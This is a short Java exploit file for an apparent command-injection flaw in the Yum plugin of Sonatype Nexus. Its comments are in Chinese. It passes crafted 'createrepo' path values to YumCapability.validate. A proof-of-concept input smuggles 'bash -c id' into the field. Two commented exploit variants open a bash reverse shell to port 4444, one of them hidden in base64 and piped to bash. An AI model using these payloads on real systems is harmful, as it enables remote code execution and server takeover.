package com.exp.cve;

import org.sonatype.nexus.yum.internal.capabilities.YumCapability;

/**
 * > 模拟在 nexus 的 Yum Configuration 输入 `Path of "createrepo"` 或 `Path of "mergerepo"` 的情况
 * > https://github.com/sonatype/nexus-public/blob/2ba4210946b81167a8b02e9e8f132e054df190c3/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/capabilities/YumCapability.java#L82
 */
public class Main {
 
	private final static String TYPE_CREATE_REPO = "createrepo";
	
	private final static String CREATE_REPO_VERS = "[0.9.9,)";
	
	private final static String TYPE_MERGE_REPO = "mergerepo";
	
	private final static String MERGE_REPO_VERS = "[0.1,)";
	
	/**
	 * > 默认提供的注入命令仅适用于 Linux 环境
	 * > 若在 winodws 环境 debug， 需要修改注入命令
	 * @param args
	 */
	public static void main(String[] args) {
		
		/* PoC */
		String input = "bash -c id || python";
		
		/* EXP-1 */
//		String input = "bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/4444 0>&1 || python";
		
		/* EXP-2 */
//		String input = "bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i} || python";

		
		YumCapability.validate("createrepo", input, "[0.9.9,)");
//		YumCapability.validate("mergerepo", input, "[0.1,)");
	}

}